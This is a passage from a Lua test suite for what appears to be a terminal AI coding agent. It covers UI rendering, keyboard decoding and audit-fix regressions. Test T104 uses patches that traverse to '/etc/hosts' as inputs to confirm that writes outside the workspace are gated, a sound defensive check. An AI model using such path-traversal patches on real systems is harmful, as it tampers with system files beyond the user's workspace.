  ui._color_depth = "256"
  assert_eq(ui.color_depth(), "256", "T82 override 256")
  ui._color_depth = "none"
  assert_eq(ui.color_depth(), "none", "T82 override none")
  ui._color_depth = nil
  print("T82 7.1 color depth: OK")
end

-- T83: 7.2 — tokenizer: per-language kinds, block-comment state, json, unknown.
do
  local ui = assert((function() return loadfile("src/tether/ui.lua")() end)())
  local function kinds(line, lang, state)
    local out = {}
    for _, t in ipairs(ui.tokenize_line(line, lang, state or {})) do
      out[#out + 1] = t.kind
    end
    return out
  end
  local function eqkinds(a, b)
    if #a ~= #b then return false end
    for i = 1, #a do if a[i] ~= b[i] then return false end end
    return true
  end
  assert_true(eqkinds(kinds("local x = 1", "lua"),
    { "keyword", "plain", "number" }), "T83 lua basic kinds")
  assert_true(eqkinds(kinds("local x = 1 -- c", "lua"),
    { "keyword", "plain", "number", "plain", "comment" }), "T83 lua with line comment")
  local st = {}
  ui.tokenize_line("if (1) { /* open", "c", st)
  assert_true(st.bc == true, "T83 c block comment open sets state.bc")
  ui.tokenize_line(") end */ x", "c", st)
  assert_true(st.bc == nil, "T83 c block comment close clears state.bc")
  assert_true(eqkinds(kinds('{"k": 1, "b": true}', "json"),
    { "plain", "string", "plain", "number", "plain", "string", "plain", "keyword", "plain" }),
    "T83 json kinds")
  local unk = ui.tokenize_line("whatever", "unknownlang", {})
  assert_eq(#unk, 1, "T83 unknown lang single token")
  assert_eq(unk[1].kind, "plain", "T83 unknown lang kind")
  assert_eq(unk[1].text, "whatever", "T83 unknown lang text")
  print("T83 7.2 tokenizer: OK")
end

-- T84: 7.3 — md_render: SGR present for known lang at depth 256, absent at none.
do
  local ui = assert((function() return loadfile("src/tether/ui.lua")() end)())
  local function has_esc(s)
    for _ = 1, #s do if s:byte(_) == 27 then return true end end
    return false
  end
  ui._color_depth = "256"
  local out = ui.md_render("```lua\nlocal x = 1\n```", 40)
  local joined = table.concat(out, "\n")
  assert_true(has_esc(joined), "T84 SGR escape bytes present at depth 256")
  assert_true(joined:find("local", 1, true) ~= nil, "T84 keyword text present")
  assert_true(joined:find("x =",  1, true) ~= nil, "T84 code content (pre-number) present")
  ui._color_depth = "none"
  local out2 = ui.md_render("```lua\nlocal x = 1\n```", 40)
  local joined2 = table.concat(out2, "\n")
  assert_true(not has_esc(joined2), "T84 no SGR escape bytes at depth none")
  assert_true(joined2:find("local x = 1", 1, true) ~= nil, "T84 plain text at depth none")
  ui._color_depth = nil
  print("T84 7.3 md_render integration: OK")
end

-- T85: 7.4 — text invariant: SGR-stripped highlighted rows equal plain rows.
do
  local ui = assert((function() return loadfile("src/tether/ui.lua")() end)())
  local text = "```lua\nlocal x = 1\nlocal y = 2\n```"
  ui._color_depth = "256"
  local hl_rows = ui.md_render(text, 40)
  ui._color_depth = "none"
  local plain_rows = ui.md_render(text, 40)
  ui._color_depth = nil
  local function strip(s) return (s:gsub("\27%[[0-9;?%*]*[a-zA-Z]", "")) end
  assert_eq(#hl_rows, #plain_rows, "T85 highlighted and plain have same row count")
  for i = 1, #hl_rows do
    assert_eq(strip(hl_rows[i]), strip(plain_rows[i]),
      "T85 row " .. i .. " SGR-stripped equals plain")
  end
  print("T85 7.4 text invariant: OK")
end

-- T86: 7.5 — edge cases: unknown/absent fence lang uncolored; 500-line block
-- rows stay within width.
do
  local ui = assert((function() return loadfile("src/tether/ui.lua")() end)())
  local function has_esc(s)
    for _ = 1, #s do if s:byte(_) == 27 then return true end end
    return false
  end
  ui._color_depth = "256"
  local out = ui.md_render("```zfoobar\nabc\n```", 40)
  assert_true(not has_esc(table.concat(out, "\n")), "T86 unknown fence lang: no SGR")
  assert_true(table.concat(out, "\n"):find("abc", 1, true) ~= nil,
    "T86 unknown fence lang: text present")
  local out2 = ui.md_render("```\nabc\n```", 40)
  assert_true(not has_esc(table.concat(out2, "\n")), "T86 absent fence lang: no SGR")
  local lines = {}
  for i = 1, 500 do lines[i] = "local x" .. i .. " = " .. i end
  local big = "```lua\n" .. table.concat(lines, "\n") .. "\n```"
  ui._color_depth = "256"
  local out3 = ui.md_render(big, 40)
  for _, row in ipairs(out3) do
    assert_true(ui.vlen(row) <= 40, "T86 500-line block row within 40 cols")
  end
  assert_true(#out3 >= 500, "T86 500-line block: all 500+ rows rendered")
  ui._color_depth = nil
  print("T86 7.5 edge cases: OK")
end

-- T92: footer F1b — dim "─" bottom rule sits above the single footer row;
-- ASCII mode swaps the rule for "-".
do
  local bytes = { 104, 105, 13, 17 } -- "hi"\r, then Ctrl+Q quit
  local uimod, S = run_ui_with(bytes, { agent = { turn = function() return true end,
    get_history = function() return {} end } })
  uimod._paint(true)
  local L = uimod._layout()
  local rule = uimod._row(L.rule_bottom_row) or ""
  assert_true(#rule > 0, "T92 bottom rule painted at rule_bottom_row: got empty")
  assert_true(rule:find("─", 1, true) ~= nil or rule:find("%-", 1, true) ~= nil,
    "T92 bottom rule is a rule row, got: " .. rule:sub(1, 80))
  -- F1b regression: the rule can never land on the input field. The last
  -- input row sits directly above the rule and keeps the typed text.
  uimod._handle_key({ kind = "text", char = "h" })
  uimod._handle_key({ kind = "text", char = "i" })
  uimod._paint(true)
  L = uimod._layout()
  local input_row = uimod._row(L.input_row) or ""
  assert_true(input_row:find("hi", 1, true) ~= nil,
    "T92 input row keeps typed text, got: " .. input_row:sub(1, 80))
  assert_true(uimod._row(L.footer_row) ~= nil, "T92 footer row is present")
  assert_eq(L.stats_row, L.footer_row, "T92 stats share the single footer row")
  assert_eq(L.rule_bottom_row + 1, L.footer_row, "T92 footer is the row below the rule")
  print("T92 footer separator: OK")
end

-- T93: 5b — idle footer carries no mouse/kb flags and no separate flag row.
do
  local bytes = { 104, 105, 13, 17 }
  local uimod, S = run_ui_with(bytes, { agent = { turn = function() return true end,
    get_history = function() return {} end } })
  S._mouse_flag_until = os.time() + 3  -- even a fresh mouse flag must not paint
  S.kb_protocol = 1
  S.toast = nil
  uimod._paint(true)
  local L = uimod._layout()
  assert_eq(L.flags_row, nil, "T93 no separate flag row")
  local footer = uimod._row(L.footer_row) or ""
  assert_eq(footer:find("🖱", 1, true), nil, "T93 no mouse flag ever")
  assert_eq(footer:find("⌨", 1, true), nil, "T93 no kb flag ever")
  print("T93 status idle: OK")
end

-- T94: 5b — mouse mode never paints an icon (even within the old fade window).
do
  local bytes = { 104, 105, 13, 17 }
  local uimod, S = run_ui_with(bytes, { agent = { turn = function() return true end,
    get_history = function() return {} end } })
  S.mouse_mode = "auto"
  S.kb_protocol = 0
  S.toast = nil
  S._mouse_flag_until = os.time() + 3  -- fresh
  uimod._paint(true)
  local L = uimod._layout()
  assert_eq(L.flags_row, nil, "T94 no flag row for mouse")
  local footer = uimod._row(L.footer_row) or ""
  assert_eq(footer:find("🖱", 1, true), nil, "T94 no mouse icon: " .. footer:sub(1, 80))
  print("T94 mouse icon removed: OK")
end

-- T95: 5b — kb protocol never paints an icon.
do
  local bytes = { 104, 105, 13, 17 }
  local uimod, S = run_ui_with(bytes, { agent = { turn = function() return true end,
    get_history = function() return {} end } })
  S._mouse_flag_until = os.time() - 1
  S.toast = nil
  S.kb_protocol = 1
  uimod._paint(true)
  local L = uimod._layout()
  local footer = uimod._row(L.footer_row) or ""
  assert_eq(footer:find("⌨", 1, true), nil, "T95 no kb icon for protocol 1: " .. footer:sub(1, 80))
  S.kb_protocol = 0
  uimod._paint(true)
  L = uimod._layout()
  assert_eq(L.flags_row, nil, "T95 no flag row for protocol 0")
  local plain = uimod._row(L.footer_row) or ""
  assert_eq(plain:find("⌨", 1, true), nil, "T95 no kb icon for protocol 0")
  print("T95 kb icon removed: OK")
end

-- T96: every UI color follows the theme, and the legacy boolean ui.ascii
-- values still force/disable ASCII rendering.
do
  local function cfg_stub(ui)
    return { load = function()
        return { model = "test", workspace = "/tmp", ui = ui }
      end, api_key = function() return "" end }
  end
  local bytes = { 104, 105, 13, 17 }
  local agent_stub = { turn = function() return true end,
    get_history = function() return {} end }

  -- mono: no row may carry an SGR sequence
  local uimod, S = run_ui_with(bytes,
    { config = cfg_stub({ input_max_lines = 8, theme = "mono" }), agent = agent_stub })
  uimod._handle_key({ kind = "text", char = "h" })
  uimod._paint(true)
  for row = 1, S.h do
    local text = uimod._row(row) or ""
    assert_eq(text:find("\27[", 1, true) ~= nil, false,
      "T96 mono theme row " .. row .. " carries SGR: " .. text:sub(1, 60))
  end
  assert_true(#(uimod._row((uimod._layout()).stats_row) or "") > 0, "T96 mono frame painted the stats row")
  assert_true(#(uimod._row((uimod._layout()).input_row) or "") > 0, "T96 mono frame painted the input row")

  -- legacy `ascii = true` still renders the ASCII rule
  local uimod2, S2 = run_ui_with(bytes,
    { config = cfg_stub({ input_max_lines = 8, ascii = true }), agent = agent_stub })
  uimod2._paint(true)
  local L2 = uimod2._layout()
  local sep = uimod2._row(L2.rule_bottom_row) or ""
  assert_true(sep:find("-", 1, true) ~= nil,
    "T96 ascii=true paints the ASCII rule, got: " .. sep:sub(1, 60))
  assert_eq(sep:find("─", 1, true) ~= nil, false,
    "T96 ascii=true keeps no box-drawing glyphs: " .. sep:sub(1, 60))
  assert_eq((uimod2._row(L2.stats_row) or ""):find("\27[", 1, true) ~= nil, false,
    "T96 ascii=true keeps the stats line colorless")
  print("T96 theme + boolean ascii: OK")
end

-- T97: keyboard protocol — kitty CSI-u and xterm modifyOtherKeys keys are
-- decoded into the same key table as legacy bytes, and the protocol is
-- enabled on start and restored on exit.
do
  local function to_bytes(s)
    local t = {}
    for i = 1, #s do t[#t + 1] = s:byte(i) end
    return t
  end

  -- decoder in isolation, through the read_key test seam
  local qi, queue = 0, {}
  _G.tether = host_mock{
    read_char = function()
      qi = qi + 1
      if qi <= #queue then return queue[qi] end
      return 0
    end,
    read_char_nb = function()
      qi = qi + 1
      if qi <= #queue then return queue[qi] end
      return nil
    end,
  }
  local uidec = assert(loadfile("src/tether/ui.lua"))()
  local function one(seq)
    queue, qi = to_bytes(seq), 0
    return uidec._read_key()
  end

  local k = one("\27[27u")
  assert_eq(k.kind, "esc", "T97 kitty Esc is Esc, not a newline")
  k = one("\27[13u")
  assert_eq(k.kind, "enter", "T97 unmodified Enter stays Enter")
  k = one("\27[13;2u")
  assert_eq(k.kind, "newline", "T97 Shift+Enter is a newline")
  k = one("\27[13;5u")
  assert_eq(k.kind, "newline", "T97 Ctrl+Enter is a newline")
  k = one("\27[97;5u")
  assert_eq(k.kind, "ctrl", "T97 Ctrl+a is a ctrl key")
  assert_eq(k.code, 1, "T97 Ctrl+a maps to 1")
  k = one("\27[106;5u")
  assert_eq(k.code, 10, "T97 Ctrl+j maps to 10")
  k = one("\27[99;6u")
  assert_eq(k.code, 3, "T97 Ctrl+Shift+c maps to 3")
  assert_true(k.shift, "T97 Ctrl+Shift+c keeps the shift flag")
  k = one("\27[97:65;6u")
  assert_true(k.shift and k.code == 1, "T97 alternate-key sub-fields are skipped")
  k = one("\27[127;5u")
  assert_eq(k.kind, "backspace", "T97 Ctrl+Backspace stays Backspace")
  k = one("\27[1;5A")
  assert_true(k.name == "up" and k.ctrl, "T97 Ctrl+Up decodes the modifiers")
  k = one("\27[5;2~")
  assert_true(k.name == "pgup" and k.shift, "T97 Shift+PgUp keeps the key name")
  k = one("\27[2~")
  assert_eq(k.name, "insert", "T97 legacy ~ keys are unchanged")
  k = one("\27[27;5;97~")
  assert_true(k.kind == "ctrl" and k.code == 1, "T97 modifyOtherKeys Ctrl+a")
  k = one("\27[27;2;13~")
  assert_eq(k.kind, "newline", "T97 modifyOtherKeys Shift+Enter")
  k = one("\27[27;6;99~")
  assert_true(k.code == 3 and k.shift, "T97 modifyOtherKeys Ctrl+Shift+c")
  k = one("h")
  assert_true(k.kind == "text" and k.char == "h", "T97 plain text unaffected")
  k = one("\27[A")
  assert_true(k.name == "up" and not k.ctrl, "T97 bare arrows stay unmodified")

  -- enable / restore around the session
  local function run_proto(proto)
    local sink = {}
    run_ui_with({ 17 }, {
      config = { load = function()
          return { model = "test", workspace = "/tmp",
                   ui = { input_max_lines = 8, keyboard_protocol = proto } }
        end, api_key = function() return "" end },
      agent = { turn = function() return true end, get_history = function() return {} end },
    }, sink)
    return table.concat(sink)
  end
  local kitty_out = run_proto("kitty")
  assert_true(kitty_out:find("\27[>1u", 1, true) ~= nil, "T97 kitty flags pushed on start")
  assert_true(kitty_out:find("\27[<u", 1, true) ~= nil, "T97 kitty flags popped on exit")
  local mok_out = run_proto("modifyOtherKeys")
  assert_true(mok_out:find("\27[>4;2m", 1, true) ~= nil, "T97 modifyOtherKeys enabled on start")
  assert_true(mok_out:find("\27[>4;0m", 1, true) ~= nil, "T97 modifyOtherKeys restored on exit")

  -- end-to-end: Esc clears the input instead of inserting a newline, and
  -- Shift+Enter inserts one
  local bytes = {}
  for _, b in ipairs(to_bytes("hi")) do bytes[#bytes + 1] = b end
  for _, c in ipairs({ "\27[27u", "\27[13;2u" }) do
    for _, b in ipairs(to_bytes(c)) do bytes[#bytes + 1] = b end
  end
  bytes[#bytes + 1] = 17
  local _, S3 = run_ui_with(bytes, { agent = { turn = function() return true end,
    get_history = function() return {} end } })
  assert_eq(S3.input, "\n", "T97 Esc then Shift+Enter leaves a single newline")
  print("T97 keyboard protocol: OK")
end

-- ============================================================
-- fix-audit-findings regression tests (T100+)
-- ============================================================

-- T100 (1.2): the tool result body must reach the model, not just the UI.
do
  local names = {"tether", "config", "session", "api", "agent", "context", "tools"}
  local orig = {}
  for _, n in ipairs(names) do orig[n] = _G[n] end
  _G.tether = host_mock{ exec = function() return true, 0 end, realpath = function(p) return p end,
                getcwd = function() return "/ws" end, sleep = function() end }
  local calls = 0
  _G.tools = {
    run = function() return { output = "HELLO-OUTPUT", exit_code = 0, elapsed_ms = 5 } end,
    _within = function() return true end, _resolve = function(p) return p end,
    _workspace = function() return "/ws" end,
  }
  _G.session = { append = function() end }
  _G.config = { get_system_prompt = function() return nil end }
  _G.api = { stream = function(_, _, _, cb)
      calls = calls + 1
      if calls == 1 then
        cb({ type = "tool_call_start", id = "c1", name = "run" })
        cb({ type = "tool_call_delta", id = "c1", arguments = '{"command":"echo hi"}' })
      else
        cb({ type = "text_delta", text = "done" })
      end
      return true
    end }
  local agent = assert(loadfile("src/tether/agent.lua"))()
  local ev = {}
  agent.turn({ workspace = "/ws", context = {}, _session_id = "s" }, "k", "go",
    function(e) if e.type == "tool_result" then ev[#ev + 1] = e end end)
  local body
  for _, m in ipairs(agent.get_history()) do
    if m.role == "tool" then body = m.content end
  end
  assert_true(type(body) == "string" and body:find("HELLO-OUTPUT", 1, true) ~= nil,
    "T100 run body reaches history")
  assert_eq(ev[1] and ev[1].body, "HELLO-OUTPUT", "T100 UI body unchanged")
  for _, n in ipairs(names) do _G[n] = orig[n] end
  print("T100 tool result body: OK")
end

-- T101 (1.3): read resolves against cfg.workspace, independently of cwd.
do
  local orig = _G.tether
  local ws = "/tmp/tether_t101_ws"
  os.execute("rm -rf " .. ws .. " && mkdir -p " .. ws)
  local f = assert(io.open(ws .. "/a.txt", "w")); f:write("hello-ws"); f:close()
  _G.tether = host_mock{ getcwd = function() return "/tmp" end,
                realpath = function(p) return (p:gsub("/+$", "")) end }
  local tools = assert(loadfile("src/tether/tools.lua"))()
  local r, err = tools.read({ path = "a.txt" }, { workspace = ws })
  assert_true(r ~= nil and tostring(r.content):find("hello-ws", 1, true) ~= nil,
    "T101 read resolves against cfg.workspace (" .. tostring(err) .. ")")
  local r2 = tools.read({ path = "a.txt" }, nil)
  assert_true(r2 == nil, "T101 read without cfg falls back to cwd")
  _G.tether = orig
  os.execute("rm -rf " .. ws)
  print("T101 workspace resolution: OK")
end

-- T102 (1.5): --print must add the user message exactly once.
do
  local names = {"arg", "tether", "config", "session", "agent", "ui", "context"}
  local orig = {}
  for _, n in ipairs(names) do orig[n] = _G[n] end
  local log = {}
  _G.arg = { "--print", "hello" }
  _G.tether = host_mock{ getcwd = function() return "/ws" end, realpath = function(p) return p end,
                is_tty = function() return false end }
  _G.config = { load = function() return { context = {} } end, api_key = function() return "k" end }
  _G.session = { new_session = function() return "id" end, append = function() end }
  _G.agent = {
    add_user = function() log[#log + 1] = "add_user" end,
    turn = function() log[#log + 1] = "turn"; return true end,
    get_history = function() return { { role = "assistant", content = "ok" } } end,
  }
  _G.ui = {}
  _G.context = nil
  local app = assert(loadfile("src/tether/app.lua"))()
  app.run()
  assert_eq(#log, 1, "T102 print mode touches the agent once")
  assert_eq(log[1], "turn", "T102 user message added only by agent.turn")
  for _, n in ipairs(names) do _G[n] = orig[n] end
  print("T102 print mode user message: OK")
end

-- T103 (2.1): persisted [A] always patterns load on the next start.
do
  local config = assert(loadfile("src/tether/config.lua"))()
  local home = "/tmp/tether_t103_home"
  os.execute("rm -rf " .. home .. " && mkdir -p " .. home .. "/.tether")
  local f = assert(io.open(home .. "/.tether/auto_approve.lua", "w"))
  f:write('-- added by tether ([A] always) on 2026-01-01\nreturn {\n  "^run:/tmp/x$",\n}\n')
  f:close()
  local cfg = config.load(home .. "/no-such-config.lua", home)
  assert_eq(type(cfg.auto_approve), "table", "T103 auto_approve is a table")
  assert_eq(#cfg.auto_approve, 1, "T103 one persisted pattern")
  assert_eq(cfg.auto_approve[1], "^run:/tmp/x$", "T103 pattern loaded")
  local cfg2 = config.load(home .. "/no-such-config.lua", "/tmp/tether_t103_missing")
  assert_eq(#cfg2.auto_approve, 0, "T103 missing file contributes nothing")
  os.execute("rm -rf " .. home)
  print("T103 auto_approve load: OK")
end

-- T104 (2.2/2.3): patch is gated by the confirmation policy; the tool's own
-- refusal uses the shared "requires confirmation" wording.
do
  local names = {"tether", "config", "session", "api", "agent", "tools", "context"}
  local orig = {}
  for _, n in ipairs(names) do orig[n] = _G[n] end
  local function norm(p)
    if p:sub(1, 1) ~= "/" then p = "/ws/" .. p end
    while p:find("/[^/]+/%.%./") do p = p:gsub("/[^/]+/%.%./", "/") end
    return p
  end
  _G.tether = host_mock{ getcwd = function() return "/ws" end, realpath = norm }
  _G.tools = {
    _resolve = norm,
    _within = function(p) return p == "/ws" or p:sub(1, 4) == "/ws/" end,
    _workspace = function() return "/ws" end,
  }
  _G.session = { append = function() end }
  _G.config = { get_system_prompt = function() return nil end }
  _G.api = { stream = function() return true end }
  local agent = assert(loadfile("src/tether/agent.lua"))()
  local confirm_policy = _G.confirm_policy
      or assert(loadfile("src/tether/confirm_policy.lua"))()
  local cfg = { workspace = "/ws", allow_outside_workspace = false }
  assert_false(confirm_policy.should_confirm("patch",
    { patch = "--- a/src/a.lua\n+++ b/src/a.lua\n@@ -1 +1 @@\n-a\n+b\n" }, cfg),
    "T104 in-workspace patch: no confirmation")
  assert_true(confirm_policy.should_confirm("patch",
    { patch = "--- a/../etc/hosts\n+++ b/../etc/hosts\n@@ -1 +1 @@\n-a\n+b\n" }, cfg),
    "T104 out-of-workspace patch: confirmation")
  assert_true(confirm_policy.should_confirm("patch",
    { patch = "--- ../etc/hosts\n+++ ../etc/hosts\n@@ -1 +1 @@\n-a\n+b\n" }, cfg),
    "T104 prefix-less out-of-workspace patch: confirmation")
  local tools_real = assert(loadfile("src/tether/tools.lua"))()
  local _, err = tools_real.patch("--- /etc/hosts\n+++ /etc/hosts\n@@ -1 +1 @@\n-a\n+b\n",
    { workspace = "/tmp/tether_t104_ws" })
  assert_true(err ~= nil and err:find("requires confirmation", 1, true) ~= nil,
    "T104 patch refusal wording: " .. tostring(err))
  for _, n in ipairs(names) do _G[n] = orig[n] end
  print("T104 patch confirmation: OK")
end

-- T105 (2.4): path completion appends "/" to directories and descends.
do
  local orig = _G.tether
  local ws = "/tmp/tether_t105_ws"
  os.execute("rm -rf " .. ws .. " && mkdir -p " .. ws .. "/sub")
  local f = assert(io.open(ws .. "/a.txt", "w")); f:write("x"); f:close()
  local g = assert(io.open(ws .. "/sub/inner.lua", "w")); g:write("x"); g:close()
  -- realpath stub with C semantics: a trailing slash only resolves for a dir
  local dirs = {}; dirs[ws] = true; dirs[ws .. "/sub"] = true
  _G.tether = host_mock{ getcwd = function() return "/tmp" end,
    realpath = function(p)
      local n = (p:gsub("/+$", ""))
      if p:sub(-1) == "/" and not dirs[n] then return nil end
      return n
    end }
  local tools = assert(loadfile("src/tether/tools.lua"))()
  local cfg = { workspace = ws }
  local r = tools.path_complete("su", cfg)
  assert_eq(#r.candidates, 1, "T105 one candidate for 'su'")
  assert_eq(r.candidates[1], "sub/", "T105 directory gets a trailing slash")
  local r2 = tools.path_complete("sub/", cfg)
  assert_eq(#r2.candidates, 1, "T105 descends into the directory")
  -- the candidate carries the typed directory: the UI replaces the whole token,
  -- so a bare name would complete `read sub/inner.lua` to `read inner.lua`
  assert_eq(r2.candidates[1], "sub/inner.lua",
    "T105 candidate keeps the typed directory")
  local r3 = tools.path_complete("a", cfg)
  assert_eq(r3.candidates[1], "a.txt", "T105 files get no trailing slash")
  -- several candidates keep it too, since the palette applies one of them
  local h = assert(io.open(ws .. "/sub/inner.txt", "w")); h:write("x"); h:close()
  local r4 = tools.path_complete("sub/in", cfg)
  assert_eq(#r4.candidates, 2, "T105 two candidates inside the directory")
  assert_eq(r4.candidates[1], "sub/inner.lua", "T105 first candidate keeps the directory")
  assert_eq(r4.candidates[2], "sub/inner.txt", "T105 second candidate keeps the directory")
  _G.tether = orig
  os.execute("rm -rf " .. ws)
  print("T105 directory completion: OK")
end

-- T106 (3.1): portable session listing works without GNU `find -printf`.
do
  local orig = _G.tether
  _G.tether = host_mock{}
  local session = assert(loadfile("src/tether/session.lua"))()
  local dir = "/tmp/tether_t106_sessions"
  os.execute("rm -rf " .. dir .. " && mkdir -p " .. dir)
  session._session_dir = dir
  local function write(id, ws)
    local h = assert(io.open(dir .. "/" .. id .. ".jsonl", "w"))
    h:write('{"ts":"2026-01-01T00:00:00","type":"session_start","meta":{"workspace":"' .. ws .. '","model":"m"}}\n')
    h:write('{"ts":"2026-01-01T00:00:01","type":"message","role":"user","content":"hi"}\n')
    h:close()
  end
  write("aaaa", "/ws1")
  write("bbbb", "/ws2")
  local files = session.session_files("/ws1")
  assert_eq(#files, 1, "T106 workspace filter")
  assert_eq(files[1].id, "aaaa", "T106 id parsed")
  assert_eq(files[1].first_line, "hi", "T106 first user line")
  local src = assert(io.open("src/tether/session.lua")):read("*a")
  assert_true(src:find("%-printf", 1, true) == nil, "T106 no GNU find -printf")
  session._session_dir = nil
  _G.tether = orig
  os.execute("rm -rf " .. dir)
  print("T106 portable session listing: OK")
end

-- T107 (1.2): assistant text survives alongside tool_calls in encoding.
do
  local openai = assert(loadfile("src/tether/providers/openai.lua"))()
  local enc = openai.encode_messages({
    { role = "assistant", content = { text = "let me check", tool_calls = {
        { id = "c1", type = "function", ["function"] = { name = "run", arguments = '{"command":"ls"}' } } } } },
  })
  assert_true(enc:find('"content":"let me check"', 1, true) ~= nil,
    "T107 text kept with tool_calls")
  local enc2 = openai.encode_messages({
    { role = "assistant", content = { text = "", tool_calls = {
        { id = "c1", type = "function", ["function"] = { name = "run", arguments = "{}" } } } } },
  })
  assert_true(enc2:find('"content":null', 1, true) ~= nil,
    "T107 empty text stays null")
  local msgs = { { role = "assistant", content = { text = "see", tool_calls = {
      { id = "c1", type = "function", ["function"] = { name = "run", arguments = "{}" } } } } } }
  local anthropic = assert(loadfile("src/tether/providers/anthropic.lua"))()
  local abody = anthropic.build_request(msgs, "m", 128)
  assert_true(abody:find('"text":"see"', 1, true) ~= nil, "T107 anthropic text block")
  local gemini = assert(loadfile("src/tether/providers/gemini.lua"))()
  local gbody = gemini.build_request(msgs, "m", 128)
  assert_true(gbody:find('"text":"see"', 1, true) ~= nil, "T107 gemini text part")
  print("T107 assistant text with tool calls: OK")
end

-- T108 (3.4): provider errors keep the real message text.
-- add-retry-and-continuation: an error now fails the attempt (the transport
-- reads it) instead of being emitted as an event, so the retry policy decides.
do
  local openai = assert(loadfile("src/tether/providers/openai.lua"))()
  openai.reset_stream()
  local got
  openai.parse_sse_line('data: {"error":{"message":"bad key","status":401}}',
    function(e) got = e end)
  local failure = openai.stream_failure()
  assert_true(got == nil, "T108 no error event emitted")
  assert_true(failure ~= nil, "T108 failure recorded")
  assert_true(failure and failure.message:find("bad key", 1, true) ~= nil, "T108 real message surfaced")
  assert_eq(failure and failure.status, 401, "T108 status kept")
  print("T108 openai error message: OK")
end

-- T109 (3.5): the auth header temp file is created with mode 0600 before the
-- key is written, and a failed fchmod aborts the request instead of writing the
-- secret into a world-readable file.
do
  local orig = _G.tether
  local seen = {}
  _G.tether = host_mock{
    fchmod = function(path, mode)
      seen[#seen + 1] = { path = path, mode = mode }
      return true
    end,
  }
  local api = assert(loadfile("src/tether/api.lua"))()
  local path = api._header_file({ "Authorization: Bearer secret" })
  assert_notnil(path, "T109 header file created")
  assert_eq(#seen, 1, "T109 mode applied before the key is written")
  assert_eq(seen[1].mode, tonumber("600", 8), "T109 mode 0600 requested")
  assert_eq(seen[1].path, path, "T109 mode applied to the header file")
  local h = assert(io.open(path))
  local content = h:read("*a")
  h:close()
  assert_true(content:find("secret", 1, true) ~= nil, "T109 key written")
  os.remove(path)

  _G.tether = host_mock{ fchmod = function() return nil, "not permitted" end }
  local api2 = assert(loadfile("src/tether/api.lua"))()
  assert_eq(api2._header_file({ "Authorization: Bearer secret" }), nil,
    "T109 no header file when fchmod fails")
  _G.tether = orig
  print("T109 header file permissions: OK")
end

-- T110 (3.7): a string/float timeout from the model is coerced, not fatal.
-- `run` is the only caller of tether.exec, and it must hand the command over as
-- `/bin/sh -c` under `timeout` (host spec: Process and pipe API).
do
  local orig = _G.tether
  local ws = "/tmp/tether_t110_ws"
  os.execute("rm -rf " .. ws .. " && mkdir -p " .. ws)
  local seen_cmd
  _G.tether = host_mock{ getcwd = function() return "/tmp" end,
                realpath = function(p) return (p:gsub("/+$", "")) end,
                -- mirrors the C contract: (ok, exit_code) where ok is true only
                -- for exit code 0 (src/host/main.c l_exec)
                exec = function(cmd)
                  seen_cmd = cmd
                  local ok, how, code = os.execute(cmd)
                  if ok then return true, 0 end
                  if how == "exit" then return false, code end
                  return false, 1
                end }
  local tools = assert(loadfile("src/tether/tools.lua"))()
  local r = tools.run({ command = "echo hi", timeout = "1" }, { workspace = ws })
  assert_true(r ~= nil and type(r.exit_code) == "number", "T110 string timeout coerced")
  assert_true((r.output or ""):find("hi", 1, true) ~= nil, "T110 command ran")
  assert_true(seen_cmd ~= nil and seen_cmd:find("sh -c", 1, true) ~= nil,
    "T110 run goes through /bin/sh -c")
  assert_true(seen_cmd:find("timeout", 1, true) ~= nil, "T110 run is timeout-wrapped")
  local r2 = tools.run({ command = "exit 3", timeout = "1" }, { workspace = ws })
  assert_eq(r2.exit_code, 3, "T110 non-zero exit code propagated")
  _G.tether = orig
  os.execute("rm -rf " .. ws)
  print("T110 run timeout coercion: OK")
end

-- T111 (3.9): the shared JSON helpers decode nested objects and escapes.
do
  local common = assert(loadfile("src/tether/providers/common.lua"))()
  local obj = common.json_decode('{"a":{"b":[1,2,3]},"c":"x\\ny"}')
  assert_eq(obj.a.b[3], 3, "T111 json_decode nested array")
  assert_eq(obj.c, "x\ny", "T111 json_decode newline escape")
  assert_true(common.json_decode and common.json_unescape ~= nil, "T111 helpers exported")
  print("T111 shared JSON helpers: OK")
end

-- T112 (bonus regression): patch applies in-workspace. Before this change the
-- patch body wrapped gmatch in ipairs and raised on the first line.
do
  local orig = _G.tether
  local ws = "/tmp/tether_t112_ws"
  os.execute("rm -rf " .. ws .. " && mkdir -p " .. ws)
  local f = assert(io.open(ws .. "/a.txt", "w")); f:write("one\ntwo\n"); f:close()
  _G.tether = host_mock{ getcwd = function() return "/tmp" end,
                realpath = function(p) return (p:gsub("/+$", "")) end }
  local tools = assert(loadfile("src/tether/tools.lua"))()
  local function read(p)
    local hh = assert(io.open(p)); local d = hh:read("*a"); hh:close(); return d
  end
  -- prefix-less header
  local diff = "--- a.txt\n+++ a.txt\n@@ -1,2 +1,2 @@\n one\n-two\n+three\n"
  local r, err = tools.patch(diff, { workspace = ws })
  assert_true(r ~= nil, "T112 patch applied (" .. tostring(err) .. ")")
  local out = read(ws .. "/a.txt")
  assert_true(out:find("three", 1, true) ~= nil and out:find("two", 1, true) == nil,
    "T112 file content updated")
  -- git-style a//b/ headers target the real path, not b/...
  local f2 = assert(io.open(ws .. "/g.txt", "w")); f2:write("one\n"); f2:close()
  local r2, err2 = tools.patch("--- a/g.txt\n+++ b/g.txt\n@@ -1 +1 @@\n-one\n+two\n", { workspace = ws })
  assert_true(r2 ~= nil, "T112 git-style patch applied (" .. tostring(err2) .. ")")
  assert_true(read(ws .. "/g.txt"):find("two", 1, true) ~= nil, "T112 git-style target updated")
  assert_true(not io.open(ws .. "/b/g.txt"), "T112 no b/ prefixed file created")
  -- new file via /dev/null
  local r3, err3 = tools.patch("--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1 @@\n+fresh\n", { workspace = ws })
  assert_true(r3 ~= nil, "T112 new file patch applied (" .. tostring(err3) .. ")")
  assert_true(read(ws .. "/new.txt"):find("fresh", 1, true) ~= nil, "T112 new file created")
  _G.tether = orig
  os.execute("rm -rf " .. ws)
  print("T112 patch applies: OK")
end

-- T113 (1.4/1.5/2.2): `list`, `glob` and `grep` run on the in-process
-- primitives (readdir/stat/krep_search) with their documented record shapes:
-- workspace-relative paths, glob's recursive walk plus 500-file cap and `**`
-- depth, and grep's {path, line, column, text} with column always 1.
do
  local orig = _G.tether
  local ws = "/tmp/tether_t113_ws"
  local last_krep = {}

  local dirs = {
    [ws] = { "a.txt", "big", "sub" },
    [ws .. "/sub"] = { "b.lua", "deep" },
    [ws .. "/sub/deep"] = { "c.lua" },
    [ws .. "/big"] = {},
  }
